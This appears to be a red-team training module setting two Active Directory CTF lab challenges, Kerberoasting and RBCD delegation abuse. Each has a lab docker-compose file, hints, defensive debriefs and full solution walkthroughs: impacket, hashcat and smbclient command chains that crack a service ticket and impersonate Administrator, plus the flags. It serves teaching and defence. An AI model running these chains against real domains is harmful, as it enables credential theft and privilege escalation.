---
title: "Red Team CTF Sprint — Day 1: Active Directory Warm-Up"
tags: [red-team, CTF, active-directory, Kerberoasting, RBCD, BloodHound,
  privilege-escalation, T1558.003, T1558.001, sprint, intermediate, challenge]
module: 08-RedTeam-03
day: 551
related_topics:
  - Milestone 550 Retrospective (Day 550)
  - Delegation Attacks (Day 543)
  - Offshore Lab Episodes (Days 535–538)
  - Red Team CTF Sprint Day 2 (Day 552)
---

# Day 551 — Red Team CTF Sprint: Day 1

> "The sprint starts here. Nine days, escalating difficulty, unknown environments.
> No walkthroughs in front of you. Your methodology card and your brain.
> Day 1 is warm-up — if you are struggling here, your gap analysis from Day 550
> was wrong. Fix that before Day 3."
>
> — Ghost

---

## Goals

Execute two intermediate Active Directory CTF challenges under time pressure.
Demonstrate Kerberoasting-to-lateral-movement without reference material.
Demonstrate RBCD exploitation from a non-admin foothold.
Document findings in real time using the engagement log format.

**Prerequisites:** Days 514–516 (Kerberos), Day 543 (delegation / RBCD),
Days 535–540 (Offshore labs for speed practice).
**Time budget:** 4 hours total (2 hours per challenge — strict time box).

---

## Challenge 1 — Roast the Service

### Category
Active Directory / Credential Access

### Difficulty
Intermediate
Estimated time: 90 minutes for a student at target level

### Learning Objective
Identify a Kerberoastable service account through BloodHound, crack the
ticket offline, and leverage the recovered credential to access a protected
resource — without using any high-privilege accounts at any step.

### Scenario

```
You have a foothold on WORKSTATION-01 (10.10.20.15) as a standard domain
user: corp\jdoe (password already in your notes).

Intel brief:
  → The domain corp.local runs on DC01 (10.10.20.5)
  → There is a backup service running on BACKUP-01 (10.10.20.30)
  → The flag lives on \\BACKUP-01\BackupShare\flag.txt
  → You do not have access to BackupShare as jdoe
  → Somewhere in this domain is a service account with a weak password
```

### Vulnerability / Technique
T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
CWE-521 — Weak Password Requirements

### Setup

```yaml
# docker-compose.yml (lab environment)
version: "3.9"
services:
  dc01:
    image: corplab/dc01:kerberoast
    hostname: DC01
    networks:
      corpnet:
        ipv4_address: 10.10.20.5
    environment:
      - DOMAIN=corp.local
      - ADMIN_PASS=LabAdmin!23
      - SPN_ACCOUNT=svc_backup
      - SPN_PASSWORD=Backup2019   # intentionally weak

  backup01:
    image: corplab/winserver:smb
    hostname: BACKUP-01
    networks:
      corpnet:
        ipv4_address: 10.10.20.30
    environment:
      - SHARE_NAME=BackupShare
      - SHARE_OWNER=svc_backup
      - FLAG=CTF{kerberoast_weak_service_accounts_die_first}

  workstation01:
    image: corplab/win10:domain-joined
    hostname: WORKSTATION-01
    networks:
      corpnet:
        ipv4_address: 10.10.20.15

networks:
  corpnet:
    driver: bridge
    ipam:
      config:
        - subnet: 10.10.20.0/24
```

### Hint Progression
1. BloodHound has a pre-built query for Kerberoastable users. Run it.
2. The ticket format `$krb5tgs$23$...` maps to hashcat mode 13100.
3. Once you have the plaintext password, how do you authenticate to SMB
   as a different user from a Linux host?

### Solution Walkthrough

```bash
# STEP 1: BloodHound collection
proxychains bloodhound-python \
    -d corp.local -u jdoe -p 'jdoe_pass' \
    -c All --dc 10.10.20.5 --zip

# STEP 2: Identify Kerberoastable accounts
# BloodHound query: "List all Kerberoastable Accounts"
# Result: svc_backup@corp.local — has SPN, standard user account

# OR: enumerate directly
proxychains impacket-GetUserSPNs \
    corp.local/jdoe:'jdoe_pass' \
    -dc-ip 10.10.20.5 \
    -request -outputfile kerberoast.txt

# STEP 3: Crack offline
hashcat -a 0 -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
# Result: svc_backup:Backup2019

# STEP 4: Access BackupShare as svc_backup
proxychains smbclient \\\\10.10.20.30\\BackupShare \
    -U 'corp\svc_backup%Backup2019'
smb: \> get flag.txt
# FLAG: CTF{kerberoast_weak_service_accounts_die_first}
```

### Flag
`CTF{kerberoast_weak_service_accounts_die_first}`

### Debrief Points

```
1. Real-world case: the 2020 SolarWinds breach post-exploitation phase
   involved Kerberoastable service accounts used for lateral movement once
   inside victim networks.

2. Service accounts carry elevated privileges (backup operator, SQL service)
   but rarely trigger MFA and are infrequently monitored for auth anomalies.

3. Detection: Event ID 4769 with EncryptionType = 0x17 (RC4 — crackable).
   AES-only enforcement produces EncryptionType = 0x12 — not crackable
   with current hardware.

4. Fix: `Set-ADUser svc_backup -KerberosEncryptionType AES256` plus a
   minimum 25-character randomised password rotated quarterly via LAPS or PAM.

5. Remove unnecessary SPNs: if svc_backup does not need Kerberos auth, the
   SPN should not exist — no SPN means not Kerberoastable.
```

---

## Challenge 2 — Write Your Own Ticket

### Category
Active Directory / Privilege Escalation

### Difficulty
Intermediate
Estimated time: 90 minutes for a student at target level

### Learning Objective
Exploit Resource-Based Constrained Delegation (RBCD) from a foothold where
the current user has `GenericWrite` on a computer object — escalate to local
administrator on that computer from a non-admin starting position.

### Scenario

```
Same foothold: WORKSTATION-01 as jdoe.

New intel from BloodHound:
  → jdoe has GenericWrite on SERVER-02 (10.10.20.40)
  → SERVER-02 is not directly accessible to jdoe
  → The flag is at C:\Flags\flag.txt on SERVER-02
  → Domain MachineAccountQuota: 10 (default — you can create computer accounts)
```

### Vulnerability / Technique
RBCD — T1558 (Kerberos delegation abuse)
msDS-AllowedToActOnBehalfOfOtherIdentity write primitive

### Hint Progression
1. RBCD requires you to control a computer account. The domain's
   MachineAccountQuota means standard users can create them.
2. Three commands in sequence: addcomputer → getST (with -impersonate) →
   then use the resulting `.ccache` to access the target.
3. The SPN for accessing C$ via SMB is `cifs/SERVER-02.corp.local`.

### Solution Walkthrough

```bash
# STEP 1: Confirm GenericWrite from BloodHound
# Query: MATCH (u:User {name:"JDOE@CORP.LOCAL"})-[r:GenericWrite]->(c:Computer)
# RETURN c.name, type(r)

# STEP 2: Create an attacker-controlled computer account
proxychains impacket-addcomputer \
    corp.local/jdoe:'jdoe_pass' \
    -dc-ip 10.10.20.5 \
    -computer-name 'ATTACKPC$' \
    -computer-pass 'Att@ckPC1!'

# STEP 3: Write RBCD — set ATTACKPC$ as trusted to act for SERVER-02
proxychains impacket-rbcd \
    corp.local/jdoe:'jdoe_pass' \
    -dc-ip 10.10.20.5 \
    -action write \
    -delegate-to 'SERVER-02$' \
    -delegate-from 'ATTACKPC$'

# STEP 4: Get a service ticket impersonating Administrator on SERVER-02
proxychains impacket-getST \
    corp.local/'ATTACKPC$':'Att@ckPC1!' \
    -dc-ip 10.10.20.5 \
    -spn cifs/SERVER-02.corp.local \
    -impersonate Administrator

export KRB5CCNAME=Administrator@cifs_SERVER-02.corp.local@CORP.LOCAL.ccache

# STEP 5: Access C$ as Administrator
proxychains smbclient //10.10.20.40/C$ -k -no-pass
smb: \Flags\> get flag.txt
# FLAG: CTF{rbcd_generic_write_is_local_admin}
```

### Flag
`CTF{rbcd_generic_write_is_local_admin}`

### Debrief Points

```
1. GenericWrite on a computer object converts to local admin via RBCD in
   three impacket commands. BloodHound tracks GenericWrite edges — most
   domains have more of these than administrators realise from inherited OUs.

2. Setting MachineAccountQuota to 0 removes the "create a computer account"
   prerequisite — eliminating one half of the RBCD attack surface for
   standard users.

3. Detection: Event ID 5136 on SERVER-02$ with AttributeLDAPDisplayName =
   msDS-AllowedToActOnBehalfOfOtherIdentity. Alert on any write to this
   attribute from a non-administrative account.

4. Fix: set MachineAccountQuota to 0; audit and remove GenericWrite
   permissions from standard user groups on computer objects using
   BloodHound periodically as a defensive tool.

5. Reference: Elad Shamir, "Wagging the Dog" (2019) — the original
   publication of the RBCD abuse technique.
```

---

## Engagement Log — Day 1 Sprint

```
Time    | Challenge | Action                              | Result
--------|-----------|-------------------------------------|-------
        | C1        | BloodHound collection               |
        | C1        | Kerberoastable users identified     |
        | C1        | GetUserSPNs / getST run             |
        | C1        | hashcat cracked                     |
        | C1        | Flag retrieved                      |
        | C2        | GenericWrite confirmed in BH        |
        | C2        | ATTACKPC$ created                   |
        | C2        | RBCD written                        |
        | C2        | getST impersonation                 |
        | C2        | Flag retrieved                      |

Flags captured: [ ] C1  [ ] C2
Total time: _____ minutes
Commands executed without reference material: _____ / 10
```

---

## Key Takeaways

1. Kerberoasting requires only a valid domain user credential. It is the most
   common first privilege escalation step in a domain — BloodHound nearly
   always shows at least one Kerberoastable account in a real environment.
2. RBCD converts a write permission into local administrator access via a
   three-command impacket chain. It must be executable from memory.
3. Both techniques generate specific Windows event log entries. A monitored
   environment with the right alerts would catch both within minutes of
   execution — understanding detection is as important as knowing the attack.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q551.1, Q551.2 …).

---

## Navigation

← Previous: [Day 550 — Milestone 550: Red Team Retrospective](DAY-0550-Milestone-550-Red-Team-Retrospective.md)
→ Next: [Day 552 — Red Team CTF Sprint: Day 2](DAY-0552-Red-Team-CTF-Sprint-Day-2.md)
